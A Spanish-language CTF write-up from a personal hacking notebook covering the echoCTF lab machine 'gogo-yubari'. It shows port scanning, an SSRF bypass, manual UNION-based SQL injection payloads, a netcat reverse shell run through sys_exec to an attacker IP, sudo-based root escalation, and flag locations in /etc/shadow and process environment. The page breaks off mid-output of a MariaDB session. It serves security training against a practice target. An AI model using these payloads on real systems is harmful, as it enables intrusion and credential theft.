<!DOCTYPE HTML>
<html lang="es" class="sidebar-visible no-js ayu">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Gogo Yubari - Secronomicón</title>
        <!-- Custom HTML head -->
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="Libro de notas donde encontrarás cada truco/técnica/guía de hacking que he aprendido y recolectado de CTFS, aplicaciones reales, lectura de writeups y noticias.">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="../../../../favicon.svg">
        <link rel="shortcut icon" href="../../../../favicon.png">
        <link rel="stylesheet" href="../../../../css/variables.css">
        <link rel="stylesheet" href="../../../../css/general.css">
        <link rel="stylesheet" href="../../../../css/chrome.css">
        <link rel="stylesheet" href="../../../../css/print.css" media="print">
        <!-- Fonts -->
        <link rel="stylesheet" href="../../../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../../../fonts/fonts.css">
        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../../../highlight.css">
        <link rel="stylesheet" href="../../../../tomorrow-night.css">
        <link rel="stylesheet" href="../../../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "../../../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "ayu" : "ayu";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('ayu')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded affix "><a href="../../../../index.html">Secronomicón</a></li><li class="chapter-item expanded affix "><li class="part-title">Guías / Cursos</li><li class="chapter-item expanded "><a href="../../../../guides/oscp_bof/index.html"><strong aria-hidden="true">1.</strong> OSCP Buffer Overflow</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> Port Swigger Academy</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../guides/port_swigger_academy/sql_injection.html"><strong aria-hidden="true">2.1.</strong> SQL Injection</a></li></ol></li><li class="chapter-item expanded "><a href="../../../../guides/pwncollege/index.html"><strong aria-hidden="true">3.</strong> PwnCollege</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../guides/pwncollege/0_module/index.html"><strong aria-hidden="true">3.1.</strong> Módulo 0</a></li></ol></li><li class="chapter-item expanded "><a href="../../../../guides/active_directory/index.html"><strong aria-hidden="true">4.</strong> Active Directory</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../guides/active_directory/0_general.html"><strong aria-hidden="true">4.1.</strong> Teoría General</a></li><li class="chapter-item expanded "><a href="../../../../guides/active_directory/1_attacking.html"><strong aria-hidden="true">4.2.</strong> Atacando Active Directory</a></li></ol></li><li class="chapter-item expanded "><a href="../../../../guides/ecpptv2_lab/index.html"><strong aria-hidden="true">5.</strong> eCPPTv2 s4viLab</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../guides/ecpptv2_lab/1_aragog/index.html"><strong aria-hidden="true">5.1.</strong> Aragog</a></li><li class="chapter-item expanded "><a href="../../../../guides/ecpptv2_lab/2_nagini/index.html"><strong aria-hidden="true">5.2.</strong> Nagini</a></li><li class="chapter-item expanded "><a href="../../../../guides/ecpptv2_lab/3_fawkes/index.html"><strong aria-hidden="true">5.3.</strong> Fawkes</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.4.</strong> Matrix 1</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.5.</strong> Brainpan</div></li></ol></li><li class="chapter-item expanded "><a href="../../../../guides/nightmare/index.html"><strong aria-hidden="true">6.</strong> Nightmare</a></li><li class="chapter-item expanded affix "><li class="part-title">Misc</li><li class="chapter-item expanded "><a href="../../../../templates/index.html"><strong aria-hidden="true">7.</strong> Templates</a></li><li class="chapter-item expanded affix "><li class="part-title">Cheat Sheets</li><li class="chapter-item expanded "><a href="../../../../cheat_sheets/general.html"><strong aria-hidden="true">8.</strong> General</a></li><li class="chapter-item expanded "><a href="../../../../cheat_sheets/active_directory.html"><strong aria-hidden="true">9.</strong> Active Directory</a></li><li class="chapter-item expanded "><a href="../../../../cheat_sheets/network/general.html"><strong aria-hidden="true">10.</strong> Network</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../cheat_sheets/network/pivoting.html"><strong aria-hidden="true">10.1.</strong> Pivoting</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">11.</strong> Pwning</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../cheat_sheets/pwning/linux.html"><strong aria-hidden="true">11.1.</strong> Linux pwning</a></li><li class="chapter-item expanded "><a href="../../../../cheat_sheets/pwning/bof-oscp.html"><strong aria-hidden="true">11.2.</strong> OSCP Buffer Overflow</a></li></ol></li><li class="chapter-item expanded "><a href="../../../../cheat_sheets/fuzzing.html"><strong aria-hidden="true">12.</strong> Fuzzing</a></li><li class="chapter-item expanded "><a href="../../../../cheat_sheets/inyecciones.html"><strong aria-hidden="true">13.</strong> Inyecciones</a></li><li class="chapter-item expanded "><a href="../../../../cheat_sheets/transfer.html"><strong aria-hidden="true">14.</strong> Transferencia de archivos</a></li><li class="chapter-item expanded affix "><li class="part-title">CTFs</li><li class="chapter-item expanded "><a href="../../../../ctfs/20220922_ctf-core2022/index.html"><strong aria-hidden="true">15.</strong> 22/09/2022 - IPN Core 2022 CTF</a></li><li class="chapter-item expanded affix "><li class="part-title">Hack The Box</li><li class="chapter-item expanded "><div><strong aria-hidden="true">16.</strong> Battlegrounds</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../htb/battlegrounds/mayhem/index.html"><strong aria-hidden="true">16.1.</strong> Cyber Mayhem</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">17.</strong> Challenges</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.</strong> Boxes</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.</strong> Linux</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.1.</strong> Fácil</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.2.</strong> Medio</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.3.</strong> Difícil</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.4.</strong> Locura</div></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.</strong> Windows</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.1.</strong> Fácil</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../htb/boxes/windows/1_facil/Active/index.html"><strong aria-hidden="true">18.2.1.1.</strong> Active</a></li><li class="chapter-item expanded "><a href="../../../../htb/boxes/windows/1_facil/Devel/index.html"><strong aria-hidden="true">18.2.1.2.</strong> Devel</a></li><li class="chapter-item expanded "><a href="../../../../htb/boxes/windows/1_facil/Remote/index.html"><strong aria-hidden="true">18.2.1.3.</strong> Remote</a></li><li class="chapter-item expanded "><a href="../../../../htb/boxes/windows/1_facil/Access/index.html"><strong aria-hidden="true">18.2.1.4.</strong> Access</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.2.</strong> Medio</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../htb/boxes/windows/2_medio/Chatterbox/index.html"><strong aria-hidden="true">18.2.2.1.</strong> Chatterbox</a></li><li class="chapter-item expanded "><a href="../../../../htb/boxes/windows/2_medio/Jeeves/index.html"><strong aria-hidden="true">18.2.2.2.</strong> Jeeves</a></li><li class="chapter-item expanded "><a href="../../../../htb/boxes/windows/2_medio/SecNotes/index.html"><strong aria-hidden="true">18.2.2.3.</strong> SecNotes</a></li><li class="chapter-item expanded "><a href="../../../../htb/boxes/windows/2_medio/Silo/index.html"><strong aria-hidden="true">18.2.2.4.</strong> Silo</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.3.</strong> Difícil</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../htb/boxes/windows/3_dificil/Control/index.html"><strong aria-hidden="true">18.2.3.1.</strong> Control</a></li><li class="chapter-item expanded "><a href="../../../../htb/boxes/windows/3_dificil/Search/index.html"><strong aria-hidden="true">18.2.3.2.</strong> Search</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.4.</strong> Locura</div></li></ol></li></ol></li><li class="chapter-item expanded "><li class="part-title">echoCTF</li><li class="chapter-item expanded "><div><strong aria-hidden="true">19.</strong> Challenges</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">20.</strong> Networks</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.</strong> Targets</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">21.1.</strong> Principiante</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.2.</strong> Básico</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../echoCTF/targets/2_basic/Flanders/index.html"><strong aria-hidden="true">21.2.1.</strong> Flanders</a></li><li class="chapter-item expanded "><a href="../../../../echoCTF/targets/2_basic/Smithers/index.html"><strong aria-hidden="true">21.2.2.</strong> Smithers</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.3.</strong> Intermedio</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.4.</strong> Avanzado</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.5.</strong> Experto</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../echoCTF/targets/5_expert/gogo-yubari/index.html" class="active"><strong aria-hidden="true">21.5.1.</strong> Gogo Yubari</a></li><li class="chapter-item expanded "><a href="../../../../echoCTF/targets/5_expert/hajmetr/index.html"><strong aria-hidden="true">21.5.2.</strong> Hajmetr</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.6.</strong> Guru</div></li></ol></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu (default)</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Secronomicón</h1>

                    <div class="right-buttons">
                        <a href="../../../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="gogo-yubari"><a class="header" href="#gogo-yubari">Gogo Yubari</a></h1>
<p>Write-up de la máquina gogo-yubari de la plataforma <a href="https://echoCTF.red">echoCTF</a>.</p>
<p><img src="images/cover-gogo.jpg" alt="Cover gogo-yubari" /></p>
<h2 id="tabla-de-contenido"><a class="header" href="#tabla-de-contenido">Tabla de Contenido <!-- omit from toc --></a></h2>
<ul>
<li><a href="#introducci%C3%B3n">Introducción</a>
<ul>
<li><a href="#t%C3%A9cnicas-vistas--tags">Técnicas vistas / Tags</a></li>
<li><a href="#estad%C3%ADsticas">Estadísticas</a></li>
</ul>
</li>
<li><a href="#reconocimiento">Reconocimiento</a>
<ul>
<li><a href="#escaneo-de-host">Escaneo de host</a>
<ul>
<li><a href="#escaneo-completo-de-puertos">Escaneo completo de puertos</a></li>
<li><a href="#escaneo-espec%C3%ADfico">Escaneo específico</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#enumeraci%C3%B3n">Enumeración</a>
<ul>
<li><a href="#servicios">Servicios</a>
<ul>
<li><a href="#http---8080">http - 8080</a>
<ul>
<li><a href="#manual">Manual</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="#explotaci%C3%B3n">Explotación</a>
<ul>
<li><a href="#ssrf">SSRF</a></li>
<li><a href="#sqli">SQLi</a></li>
</ul>
</li>
<li><a href="#post-explotaci%C3%B3n">Post Explotación</a>
<ul>
<li><a href="#escalaci%C3%B3n-de-privilegios">Escalación de privilegios</a>
<ul>
<li><a href="#mysql--root">mysql → root</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#ubicaci%C3%B3n-de-banderas">Ubicación de banderas</a></li>
<li><a href="#notas-adicionales">Notas adicionales</a>
<ul>
<li><a href="#eventos-mysql">Eventos <code>mysql</code></a></li>
</ul>
</li>
<li><a href="#referencias">Referencias</a></li>
</ul>
<h2 id="introducción"><a class="header" href="#introducción">Introducción</a></h2>
<h3 id="técnicas-vistas--tags"><a class="header" href="#técnicas-vistas--tags">Técnicas vistas / Tags</a></h3>
<ul>
<li>Server Side Request Forgery (SSRF).</li>
<li>SQL Injection.</li>
</ul>
<h3 id="estadísticas"><a class="header" href="#estadísticas">Estadísticas</a></h3>
<div class="table-wrapper"><table><thead><tr><th>Característica</th><th>Descripción</th></tr></thead><tbody>
<tr><td>Nombre</td><td><a href="https://echoctf.red/target/14">gogo-yubari</a></td></tr>
<tr><td>Dificultad</td><td>Expert</td></tr>
<tr><td>Banderas</td><td>11 (7: other, 2: system, env, root)</td></tr>
<tr><td>Puntos</td><td>6,600: (other: 1,600, system: 2,600, env: 900, root: 1,500)</td></tr>
<tr><td>Descripción/Pistas</td><td>Gogo Yubari the web scrapper, named after the famous assassin, scraps echocity-f.com for validation of usability rules by producing a screenshot of the site.</td></tr>
</tbody></table>
</div>
<h2 id="reconocimiento"><a class="header" href="#reconocimiento">Reconocimiento</a></h2>
<h3 id="escaneo-de-host"><a class="header" href="#escaneo-de-host">Escaneo de host</a></h3>
<h4 id="escaneo-completo-de-puertos"><a class="header" href="#escaneo-completo-de-puertos">Escaneo completo de puertos</a></h4>
<pre><code class="language-bash">└─$ sudo nmap -sS --min-rate 5000 -v -p- -open -n -Pn -oG nmap/all_ports_ss $TARGET
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-25 23:17 EST
Initiating SYN Stealth Scan at 23:17
Scanning 10.0.200.69 [65535 ports]
Discovered open port 8080/tcp on 10.0.200.69
Completed SYN Stealth Scan at 23:17, 17.74s elapsed (65535 total ports)
Nmap scan report for 10.0.200.69
Host is up (0.15s latency).
Not shown: 61724 closed tcp ports (reset), 3810 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
8080/tcp open  http-proxy

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 17.82 seconds
           Raw packets sent: 87925 (3.869MB) | Rcvd: 66137 (2.645MB)
</code></pre>
<h4 id="escaneo-específico"><a class="header" href="#escaneo-específico">Escaneo específico</a></h4>
<pre><code class="language-bash">└─$ nmap -sCV -p 8080 -oN nmap/targeted $TARGET
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-25 23:21 EST
Nmap scan report for 10.0.200.69
Host is up (0.15s latency).

PORT     STATE SERVICE    VERSION
8080/tcp open  http-proxy GoGo go v1.11.12
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.0 200 OK
|     Server: GoGo go v1.11.12
|     Date: Thu, 26 Jan 2023 04:21:46 GMT
|     Content-Type: text/html; charset=utf-8
|     &lt;!DOCTYPE html&gt;
|     &lt;html&gt;
|     &lt;head&gt;
|     &lt;title&gt;Gogo Yubari URL Cralwer&lt;/title&gt;
|     &lt;style&gt;
|     main {
|     font-family: monospace, monospace;
|     max-width: 38rem;
|     padding: 2rem;
|     margin: auto;
|     @media only screen and (max-device-width: 736px) {
|     main {
|     padding: 0rem;
|     ::selection {
|     background: #d3869b;
|     body {
|     background: #282828;
|     color: #ebdbb2;
|     background-color: #3c3836;
|     padding: 1em;
|     border: 0;
|     a:active, a:visited {
|     color: #b16286;
|_    background-color: #1d2021;
|_http-title: Gogo Yubari URL Cralwer
|_http-server-header: GoGo go v1.11.12
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.92%I=7%D=1/25%Time=63D1FFDA%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,B67,&quot;HTTP/1\.0\x20200\x20OK\r\nServer:\x20GoGo\x20go\x20v1\.11
SF:\.12\r\nDate:\x20Thu,\x2026\x20Jan\x202023\x2004:21:46\x20GMT\r\nConten
SF:t-Type:\x20text/html;\x20charset=utf-8\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html
SF:&gt;\n\x20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;title&gt;Gogo\
SF:x20Yubari\x20URL\x20Cralwer&lt;/title&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;s
SF:tyle&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20main\x20{\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20monospace,\x20monosp
SF:ace;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20max-width:\x2038r
SF:em;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x202rem;\
SF:n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x20auto;\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20@media\x20only\x20screen\x20and\x20\(max-device-width:\x20736
SF:px\)\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20main\x20{\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x200rem
SF:;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20::s
SF:election\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20backgrou
SF:nd:\x20#d3869b;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20background:\x20#282828;\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20color:\x20\x20\x20\x20\x20\x20#ebdbb2;\n\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20pre\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20backgroun
SF:d-color:\x20#3c3836;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20p
SF:adding:\x201em;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border
SF::\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20a,\x20a:active,\x20a:visited\x20{\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#b16286;\n\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#1d2021;\n&quot;);

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.59 seconds
</code></pre>
<h2 id="enumeración"><a class="header" href="#enumeración">Enumeración</a></h2>
<h3 id="servicios"><a class="header" href="#servicios">Servicios</a></h3>
<h4 id="http---8080"><a class="header" href="#http---8080">http - 8080</a></h4>
<h5 id="manual"><a class="header" href="#manual">Manual</a></h5>
<p>En la página principal se presenta una utilidad para realizar <a href="https://es.wikipedia.org/wiki/Web_scraping">web-scrapping</a> mediante una URL la cuál se permite proporcionar.</p>
<p><img src="images/enum_1.png" alt="Página principal" /></p>
<p>A través del código fuente se expone un hostname interno (consola de administrador).</p>
<p><img src="images/enum_2.png" alt="Hostname interno" /></p>
<p>Después de enviar un formulario con la URL que puede ser enviada, se puede identificar que sólo acepta peticiones que puedan ser identificadas como internas dado que se genera una imagen en <code>/public/&lt;ip&gt;.png</code> en caso de que sea procesada correctamente, en caso contrario, la ruta de la imagen será <code>/fullscreenshot.png</code>.</p>
<h2 id="explotación"><a class="header" href="#explotación">Explotación</a></h2>
<h3 id="ssrf"><a class="header" href="#ssrf">SSRF</a></h3>
<p>Después de probar con numerosos payloads modificando valores de cabeceras de la petición (<code>Host</code>, <code>X-Forwarder-For</code>, etc.) se identificó que se logra hacer un bypass interno al sitio usando <code>https</code> en vez de <code>http</code> en la URL proveída. Por lo que al usar <code>https://localhost.echocity-f.com/</code> se genera una imagen correctamente con su respuesta.</p>
<p><img src="images/exploit_1.png" alt="Respuesta válida" /></p>
<p>Tanto con esa respuesta como al enviar nuevas rutas de prueba, se puede identificar que se está añadiendo un <code>/</code> a la ruta que se consulta, por lo que se puede buscar que no se interprete añadiendo un <code>#</code> al final como si se estuviera consultando un fragmento del sitio señalado. Ejemplo, en <code>https://book.hacktricks.xyz/welcome/readme#pentesting-methodology</code>, se está consultando el recurso readme y dentro de él se indica que se busca el fragmento <code>#pentesting-methodology</code> (véase <a href="https://www.w3.org/wiki/HashURI">W3C - Hash URI</a> y <a href="https://www.jenitennison.com/2011/03/06/hash-uris.html">Jeni Tennison - Hash URIs</a>).</p>
<p>Al visualizar que no se interpréta aparentemente, se buscó usar url encoding en el <code>#</code> para ver si resultaba en un cambio <code>https://localhost.echocity-f.com/%23</code>, permitiendo así visualizar la ruta interna y una bandera.</p>
<p><img src="images/exploit_2.png" alt="Visualización de ruta interna" /></p>
<p>En este punto se intentó consultar ciertas rutas estándares que suelen ocupar en la plataforma, tales como <code>ETSCTF</code> o <code>ETSCTF.html</code>, identificando que con la segunda después de mandar la petición se creaba un elemento en la plataforma principal.</p>
<p><img src="images/exploit_3.png" alt="Ejecución de template ETSCTF" /></p>
<p>Y en el dashboard se puede visualizar un nuevo elemento.</p>
<p><img src="images/exploit_4.png" alt="Nuevo elemento" /></p>
<p>En este punto se intentó identificar una vulnerabilidad de tipo SSTI para los templates <code>.ejs</code> dado el output obtenido al enviar la petición a <code>ETSCTF.html</code> sin obtener éxito alguno. Por lo que se buscaron otras rutas disponibles en la plataforma, identificando:</p>
<ul>
<li><code>/add</code>.</li>
<li><code>/edit</code>.</li>
</ul>
<p>En <code>/edit</code> al pasarle el id del elemento se pudieron visualizar sus valores. Ejemplo <code>https://localhost.echocity-f.com/edit?id=2</code>.</p>
<p><img src="images/exploit_5.png" alt="Contenido de elemento 2" /></p>
<p>Después al probar con <code>'</code> después del id <code>https://localhost.echocity-f.com/edit?id=2'</code> se identificó una excepción de SQL dándo paso a la siguiente fase de explotación.</p>
<p><img src="images/exploit_6.png" alt="Excepción SQL" /></p>
<h3 id="sqli"><a class="header" href="#sqli">SQLi</a></h3>
<p>Al requerir de una validación visual de inyección dado el escenario se realizo manualmente todo el proceso de inyección, buscando en primera instancia identificar el número de columnas en la tabla, mediante:</p>
<pre><code class="language-text">id=2' UNION SELECT 1,2,3,4,5-- -
</code></pre>
<p>Iterando de 1 a N hasta no obtener errores en la respuesta. Posteriormente, se buscó identificar cuál de las columnas permite desplegar cadenas de carácteres, identificando la segunda y tercera posición con (añadiendo un ordenamiento para ver el contenido en los inputs disponibles):</p>
<pre><code class="language-text">id=2' UNION SELECT 1,'a','a',4,5 ORDER BY url ASC-- -
</code></pre>
<p><img src="images/exploit_7.png" alt="Identificación de columnas de cadenas de carácteres" /></p>
<p>Podiendo visualizar la información se buscó identificar que usuario de base de datos estaba siendo usado para tratar de asumir con qué permisos se contaba. Usando:</p>
<pre><code class="language-text">id=2' UNION SELECT 1,user(),'a',4,5 ORDER BY url ASC-- -
</code></pre>
<p><img src="images/exploit_8.png" alt="Usuario de base de datos" /></p>
<p>Al identificar al usuario <code>root</code> se buscó ejecutar directamente una reverse shell con:</p>
<pre><code class="language-text">id=2' UNION SELECT 1,sys_exec('nc -e /bin/bash 10.10.0.50 1234'),'a',4,5-- -
</code></pre>
<p>Obteniendo así, acceso a la máquina.</p>
<p><img src="images/exploit_9.png" alt="Acceso a máquina" /></p>
<h2 id="post-explotación"><a class="header" href="#post-explotación">Post Explotación</a></h2>
<h3 id="escalación-de-privilegios"><a class="header" href="#escalación-de-privilegios">Escalación de privilegios</a></h3>
<h4 id="mysql--root"><a class="header" href="#mysql--root">mysql → root</a></h4>
<p>Al ejecutar <code>sudo -l</code> se puede visualizar que el usuario no tiene restricción alguna para ejecutar binarios con <code>sudo</code>, por lo que al ejecutar <code>sudo bash</code>, se obtiene acceso como <code>root</code>.</p>
<p><img src="images/post_1.png" alt="Acceso como root" /></p>
<h2 id="ubicación-de-banderas"><a class="header" href="#ubicación-de-banderas">Ubicación de banderas</a></h2>
<ol>
<li>(other: 100 pts x2) <code>/app/frontend/forms.html</code> x2.</li>
<li>(other: 100 pts) <code>/app/frontend/forms.go</code>.</li>
<li>(other: 100 pts) <code>/app/frontend/ETSCTF.html</code>.</li>
<li>(other: 400 pts) <code>/app/backend/views/etsctf.ejs</code>.</li>
<li>(other: 500 pts) mysql event (Revisar <a href="#eventos-mysql">eventos mysql</a>).</li>
<li>(other: 300 pts) scrapper databases (visto desde la plataforma interna o dentro de la base de datos).</li>
<li>(system: 1300 pts) <code>/etc/passwd</code>.</li>
<li>(system: 1300 pts) <code>/etc/shadow</code>.</li>
<li>(env: 900 pts) <code>strings /proc/1/environ | grep ETSCTF_</code>.</li>
<li>(root: 1500 pts) <code>/root</code></li>
</ol>
<h2 id="notas-adicionales"><a class="header" href="#notas-adicionales">Notas adicionales</a></h2>
<h3 id="eventos-mysql"><a class="header" href="#eventos-mysql">Eventos <code>mysql</code></a></h3>
<p>Después de realizar búsquedas recursivas en los directorios que ocupan la intrusión, encontré la bandera en el archivo que se interpreta como binario <code>/var/lib/mysql/event.MYD</code>. Al realizar el submit de la misma me encontré que el nombre hace alusión a los eventos de MySQL, al no conocerlos decídi buscar información al repecto y la manera de consultarlos correctamente a través del cliente <code>mysql</code>. Encontrando que estos pueden ser configurados a través del <code>Event Scheduler</code> para ejecutar consultas definidas por el usuario para completar una tarea (algo similar a los cron jobs en linux). Permitiendo consultar su nombre y su contenido con:</p>
<pre><code class="language-bash">MariaDB [(none)]&gt; use scrapper;
use scrapper;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [scrapper]&gt; show events\G # Para consultar los eventos configurados.
show events\G
*************************** 1. row ***************************
                  Db: scrapper
                Name: ev_crawl_pending_queue
